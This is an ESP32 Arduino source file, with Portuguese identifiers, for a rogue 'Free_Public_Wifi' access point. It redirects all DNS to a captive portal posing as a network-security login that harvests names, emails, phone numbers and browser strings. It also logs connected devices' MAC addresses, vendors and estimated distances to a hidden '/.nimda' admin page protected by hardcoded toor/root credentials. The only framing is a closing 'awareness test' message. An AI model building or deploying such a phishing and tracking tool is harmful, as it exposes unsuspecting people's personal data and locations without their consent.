#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <lwip/inet.h>

const char* adminUser = "toor";
const char* adminPass = "root";

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
AsyncWebServer server(80);

struct Device {
  String ssid;
  String mac;
  String ip;
  String fabricante;
  int rssi;
};
Device historico[15];
int totalDevices = 0;

struct Credencial {
  String nome;
  String email;
  String telefone;
  String dispositivo;
};
Credencial logs[15];
int totalLogs = 0;

float calcularDistancia(int rssi) {
  if (rssi == 0) return 0.0;
  return pow(10, (float)(-40 - rssi) / 20.0);
}

String nomeRedeDevice = "Free_Public_Wifi";

String identificarFabricante(uint8_t* mac) {
  if (mac[0] == 0xBC) return "Apple";
  if (mac[0] == 0x3C) return "Samsung";
  if (mac[0] == 0x24) return "Xiaomi";
  return "Generico";
}

String getPortalHTML() {
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>body{background:#0a0a0a;color:#e0e0e0;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}";
  html += ".card{background:#1a1a1a;padding:30px;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,0.5);width:90%;max-width:400px;border:1px solid #333;}";
  html += "h2{color:#00ff41;margin-bottom:10px;text-align:center;font-size:1.2em;}";
  html += "p{font-size:0.9em;color:#888;text-align:center;margin-bottom:20px;}";
  html += "input{width:100%;padding:12px;margin:8px 0;background:#252525;border:1px solid #444;border-radius:5px;color:#fff;box-sizing:border-box;}";
  html += "button{width:100%;padding:12px;background:#00ff41;border:none;border-radius:5px;color:#000;font-weight:bold;cursor:pointer;margin-top:10px;}";
  html += ".footer{font-size:0.7em;color:#444;text-align:center;margin-top:20px;}</style></head><body>";
  html += "<div class='card'><h2>SEGURANÇA DE REDE</h2><p>Autenticação necessária para prosseguir.</p>";
  html += "<form action='/post' method='POST'>";
  html += "<input type='text' name='nome' placeholder='Nome Completo' required>";
  html += "<input type='email' name='email' placeholder='seu@email.com' required>";
  html += "<input type='tel' name='tel' placeholder='(00) 00000-0000' required>";
  html += "<button type='submit'>AUTENTICAR</button></form></div></body></html>";
  return html;
}

void sinalizarAtividade() {
  digitalWrite(2, LOW);
  delay(100);
  digitalWrite(2, HIGH);
}

void setup() {
  Serial.begin(115200);
  pinMode(2, OUTPUT);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(nomeRedeDevice.c_str());

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", getPortalHTML());
  });

  server.on("/post", HTTP_POST, [](AsyncWebServerRequest *request){
    String n = request->hasParam("nome", true) ? request->getParam("nome", true)->value() : "";
    String e = request->hasParam("email", true) ? request->getParam("email", true)->value() : "";
    String t = request->hasParam("tel", true) ? request->getParam("tel", true)->value() : "";

    String agente = request->hasHeader("User-Agent") ? request->getHeader("User-Agent")->value() : "Desconhecido";
    if (agente.length() > 60) agente = agente.substring(0, 57) + "...";
    
    if (totalLogs < 15) {
      logs[totalLogs] = {n, e, t, agente};
      totalLogs++;
      sinalizarAtividade();
    }

    request->send(200, "text/html",
      "<html><head><meta charset='UTF-8'></head>"
      "<html><body style='background:#0a0a0a;color:#ffcc00;text-align:center;font-family:sans-serif;padding-top:50px;'>"
      "<h1>Alerta de Segurança!</h1>"
      "<p style='color:#e0e0e0;'>Este foi um teste de conscientização.</p>"
      "<div style='background:#222;padding:20px;border-radius:10px;display:inline-block;border:1px solid #ffcc00;'>"
      "  <p>Você acabou de se conectar a uma rede Wi-Fi aberta e inseriu dados sensíveis.</p>"
      "  <p><b>Nunca insira informações pessoais em portais desconhecidos!</b></p>"
      "</div>"
      "</body></html>");
    });

  server.on("/.nimda", HTTP_GET, [](AsyncWebServerRequest *request){
    if(!request->authenticate(adminUser, adminPass)) {
        return request->requestAuthentication();
    }

    String html = "<html><head><meta charset='UTF-8'><style>body{font-family:sans-serif;background:#1a1a1a;color:#fff;padding:20px;} table{width:100%;border-collapse:collapse;margin-bottom:30px;} th,td{border:1px solid #444;padding:10px;text-align:left;} th{background:#333;color:#00ff41;}</style></head><body>";
    
    html += "<h2>DISPOSITIVOS (PROXIMIDADE)</h2><table>";
    html += "<tr><th>MAC</th><th>Fabricante</th><th>Distância Est.</th><th>Sinal</th></tr>";
    for(int i=0; i<totalDevices; i++) {
      float d = calcularDistancia(historico[i].rssi);
      html += "<tr><td>"+historico[i].mac+"</td><td>"+historico[i].fabricante+"</td><td>"+String(d, 2)+"m</td><td>"+String(historico[i].rssi)+" dBm</td></tr>";
    }
    html += "</table>";

    html += "<h2>CREDENCIAIS E DISPOSITIVOS</h2><table>";
    html += "<tr><th>Nome</th><th>Email</th><th>Telefone</th><th>SO / Navegador</th></tr>";
    for(int i=0; i<totalLogs; i++) {
      html += "<tr><td>"+logs[i].nome+"</td><td>"+logs[i].email+"</td><td>"+logs[i].telefone+"</td><td style='font-size:10px;'>"+logs[i].dispositivo+"</td></tr>";
    }
    html += "</table></body></html>";

    request->send(200, "text/html", html);
  });

  server.onNotFound([](AsyncWebServerRequest *request){
    request->send(200, "text/html", getPortalHTML());
  });

  server.begin();
  digitalWrite(2, HIGH);
}

void loop() {
  dnsServer.processNextRequest();

  static unsigned long lastScan = 0;
  if (millis() - lastScan > 4000) {
    lastScan = millis();
    
    wifi_sta_list_t stationList;
    tcpip_adapter_sta_list_t adapterStationList;
    esp_wifi_ap_get_sta_list(&stationList);
    tcpip_adapter_get_sta_list(&stationList, &adapterStationList);

    for (int i = 0; i < adapterStationList.num; i++) {
      tcpip_adapter_sta_info_t station = adapterStationList.sta[i];
      char macBuf[18];
      snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X", 
               station.mac[0], station.mac[1], station.mac[2], 
               station.mac[3], station.mac[4], station.mac[5]);
      
      String macStr = String(macBuf);
      String ipStr = String(inet_ntoa(station.ip));
      int rssi = (int)stationList.sta[i].rssi;
      String fab = identificarFabricante(station.mac);

      bool existe = false;
      for(int k=0; k<totalDevices; k++) {
        if(historico[k].mac == macStr) {
          historico[k].rssi = rssi;
          existe = true;
        }
      }

      if(!existe && totalDevices < 15) {
        historico[totalDevices] = { "Free_Public_Wifi", macStr, ipStr, fab, rssi };
        totalDevices++;
        sinalizarAtividade();
      }
    }
  }
}